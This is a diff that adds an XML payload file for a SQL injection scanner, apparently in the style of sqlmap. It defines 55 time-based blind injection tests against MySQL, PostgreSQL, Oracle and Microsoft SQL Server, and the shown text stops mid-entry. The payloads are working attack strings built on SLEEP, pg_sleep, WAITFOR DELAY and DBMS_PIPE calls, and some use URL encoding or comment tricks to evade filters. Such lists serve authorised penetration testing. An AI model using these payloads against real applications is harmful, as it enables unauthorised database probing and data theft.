@@ -1,0 +1,2326 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<root>
+    <test>
+        <title>Time-Based Blind - MySQL - 1</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'%0aAND%0aSLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>'%0aAND%0aSLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 2</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>0 AND SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>0 AND SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 3</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'%0d%0aAND%0d%0aSLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>'%0d%0aAND%0d%0aSLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Oracle - 4</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>0 || DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])--</vector>
+        <request>
+            <payload>0 || DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 5</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>0 OR SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>0 OR SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 6</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>0 || pg_sleep([SLEEPTIME])--</vector>
+        <request>
+            <payload>0 || pg_sleep([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 7</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>0; SELECT pg_sleep([SLEEPTIME])--</vector>
+        <request>
+            <payload>0; SELECT pg_sleep([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 8</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>0; WAITFOR DELAY '0:0:[SLEEPTIME]'--</vector>
+        <request>
+            <payload>0; WAITFOR DELAY '0:0:[SLEEPTIME]'--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 9</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>1' AND SLEEP([SLEEPTIME]) AND '1'='1</vector>
+        <request>
+            <payload>1' AND SLEEP([SLEEPTIME]) AND '1'='1</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 10</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>-1 OR SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>-1 OR SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 11</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>1 OR SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>1 OR SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 12</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>1' OR SLEEP([SLEEPTIME]) OR '1'='1</vector>
+        <request>
+            <payload>1' OR SLEEP([SLEEPTIME]) OR '1'='1</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 13</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>1; SELECT pg_sleep([SLEEPTIME])--</vector>
+        <request>
+            <payload>1; SELECT pg_sleep([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 14</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>1 WAITFOR DELAY '0:0:[SLEEPTIME]'--</vector>
+        <request>
+            <payload>1 WAITFOR DELAY '0:0:[SLEEPTIME]'--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 15</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>1; WAITFOR DELAY '0:0:[SLEEPTIME]'--</vector>
+        <request>
+            <payload>1; WAITFOR DELAY '0:0:[SLEEPTIME]'--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Oracle - 16</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'%20AND%201=DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])--</vector>
+        <request>
+            <payload>'%20AND%201=DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 17</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'%20AND%20IF(1=1,SLEEP([SLEEPTIME]),0)--</vector>
+        <request>
+            <payload>'%20AND%20IF(1=1,SLEEP([SLEEPTIME]),0)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 18</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'%20AND%20pg_sleep([SLEEPTIME])--</vector>
+        <request>
+            <payload>'%20AND%20pg_sleep([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 19</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'%20AND%20(SELECT%20CASE%20WHEN%20(1=1)%20THEN%20pg_sleep([SLEEPTIME])%20ELSE%20pg_sleep(0)%20END)%20IS%20NOT%20NULL--</vector>
+        <request>
+            <payload>'%20AND%20(SELECT%20CASE%20WHEN%20(1=1)%20THEN%20pg_sleep([SLEEPTIME])%20ELSE%20pg_sleep(0)%20END)%20IS%20NOT%20NULL--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 20</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'%20AND%20SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>'%20AND%20SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 21</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>';%20IF%20(1=1)%20WAITFOR%20DELAY%20'0:0:[SLEEPTIME]'--</vector>
+        <request>
+            <payload>';%20IF%20(1=1)%20WAITFOR%20DELAY%20'0:0:[SLEEPTIME]'--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Oracle - 22</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'%20OR%201=DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])--</vector>
+        <request>
+            <payload>'%20OR%201=DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 23</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'%20OR%20pg_sleep([SLEEPTIME])--</vector>
+        <request>
+            <payload>'%20OR%20pg_sleep([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 24</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'%20OR%20(SELECT%201%20FROM%20(SELECT%20SLEEP([SLEEPTIME]))%20t)--</vector>
+        <request>
+            <payload>'%20OR%20(SELECT%201%20FROM%20(SELECT%20SLEEP([SLEEPTIME]))%20t)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 25</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'%20OR%20SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>'%20OR%20SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 26</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'%20WAITFOR%20DELAY%20'0:0:[SLEEPTIME]'--</vector>
+        <request>
+            <payload>'%20WAITFOR%20DELAY%20'0:0:[SLEEPTIME]'--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 27</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>';%20WAITFOR%20DELAY%20'0:0:[SLEEPTIME]'--</vector>
+        <request>
+            <payload>';%20WAITFOR%20DELAY%20'0:0:[SLEEPTIME]'--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 28</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'/*!50000AND*/IF(1=1,SLEEP([SLEEPTIME]),0)--</vector>
+        <request>
+            <payload>'/*!50000AND*/IF(1=1,SLEEP([SLEEPTIME]),0)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 29</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'/*!50000AND*/SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>'/*!50000AND*/SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 30</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'/*!50000OR*/(SELECT 1 FROM (SELECT SLEEP([SLEEPTIME])) t)--</vector>
+        <request>
+            <payload>'/*!50000OR*/(SELECT 1 FROM (SELECT SLEEP([SLEEPTIME])) t)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 31</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'/*!50000OR*/SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>'/*!50000OR*/SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 32</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' AND 1=1; WAITFOR DELAY '0:0:[SLEEPTIME]'--</vector>
+        <request>
+            <payload>' AND 1=1; WAITFOR DELAY '0:0:[SLEEPTIME]'--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 33</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>')) AND 1=1; WAITFOR DELAY '0:0:[SLEEPTIME]'--</vector>
+        <request>
+            <payload>')) AND 1=1; WAITFOR DELAY '0:0:[SLEEPTIME]'--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Oracle - 34</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])--</vector>
+        <request>
+            <payload>' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Oracle - 35</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'/**/AND/**/1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])--</vector>
+        <request>
+            <payload>'/**/AND/**/1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 36</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' AND 1=(SELECT 1 FROM pg_sleep([SLEEPTIME]))--</vector>
+        <request>
+            <payload>' AND 1=(SELECT 1 FROM pg_sleep([SLEEPTIME]))--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 37</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' AND (CASE WHEN (1=1) THEN SLEEP([SLEEPTIME]) ELSE 0 END)--</vector>
+        <request>
+            <payload>' AND (CASE WHEN (1=1) THEN SLEEP([SLEEPTIME]) ELSE 0 END)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 38</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' AND IF(1=1,SlEeP([SLEEPTIME]),0)--</vector>
+        <request>
+            <payload>' AND IF(1=1,SlEeP([SLEEPTIME]),0)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 39</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>" AND IF(1=1,SLEEP([SLEEPTIME]),0)--</vector>
+        <request>
+            <payload>" AND IF(1=1,SLEEP([SLEEPTIME]),0)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 40</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' AND IF(1=1,SLEEP([SLEEPTIME]),0)--</vector>
+        <request>
+            <payload>' AND IF(1=1,SLEEP([SLEEPTIME]),0)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 41</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>') AND IF(1=1,SLEEP([SLEEPTIME]),0)--</vector>
+        <request>
+            <payload>') AND IF(1=1,SLEEP([SLEEPTIME]),0)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 42</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>')) AND IF(1=1,SLEEP([SLEEPTIME]),0)--</vector>
+        <request>
+            <payload>')) AND IF(1=1,SLEEP([SLEEPTIME]),0)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 43</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'/*!AND*/IF(1=1,SLEEP([SLEEPTIME]),0)--</vector>
+        <request>
+            <payload>'/*!AND*/IF(1=1,SLEEP([SLEEPTIME]),0)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 44</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'/**/AND/**/IF(1=1,SLEEP([SLEEPTIME]),0)--</vector>
+        <request>
+            <payload>'/**/AND/**/IF(1=1,SLEEP([SLEEPTIME]),0)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 45</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' AND IF(2>1,SLEEP([SLEEPTIME]),0)--</vector>
+        <request>
+            <payload>' AND IF(2>1,SLEEP([SLEEPTIME]),0)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 46</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' AND pg_sleep([SLEEPTIME])--</vector>
+        <request>
+            <payload>' AND pg_sleep([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 47</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'/**/AND/**/pg_sleep([SLEEPTIME])--</vector>
+        <request>
+            <payload>'/**/AND/**/pg_sleep([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 48</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' AND PG_SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>' AND PG_SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 49</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' AND (pg_sleep([SLEEPTIME])) IS NOT NULL--</vector>
+        <request>
+            <payload>' AND (pg_sleep([SLEEPTIME])) IS NOT NULL--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Oracle - 50</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' AND (SELECT 1 FROM dual WHERE 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])=1) IS NOT NULL--</vector>
+        <request>
+            <payload>' AND (SELECT 1 FROM dual WHERE 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])=1) IS NOT NULL--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 51</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>') AND (SELECT 1 FROM pg_sleep([SLEEPTIME]))=1--</vector>
+        <request>
+            <payload>') AND (SELECT 1 FROM pg_sleep([SLEEPTIME]))=1--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 52</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' AND (SELECT 1 FROM (SELECT SLEEP([SLEEPTIME])) t)--</vector>
+        <request>
+            <payload>' AND (SELECT 1 FROM (SELECT SLEEP([SLEEPTIME])) t)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 53</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' AND (SELECT CASE WHEN (1=1) THEN pg_sleep([SLEEPTIME]) ELSE pg_sleep(0) END) IS NOT NULL--</vector>
+        <request>
+            <payload>' AND (SELECT CASE WHEN (1=1) THEN pg_sleep([SLEEPTIME]) ELSE pg_sleep(0) END) IS NOT NULL--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 54</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'/**/AND/**/(SELECT CASE WHEN (1=1) THEN pg_sleep([SLEEPTIME]) ELSE pg_sleep(0) END) IS NOT NULL--</vector>
+        <request>
+            <payload>'/**/AND/**/(SELECT CASE WHEN (1=1) THEN pg_sleep([SLEEPTIME]) ELSE pg_sleep(0) END) IS NOT NULL--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 55</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' AND (SELECT COUNT(*) FROM pg_sleep([SLEEPTIME]))>0--</vector>
+        <request>
+            <payload>' AND (SELECT COUNT(*) FROM pg_sleep([SLEEPTIME]))>0--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
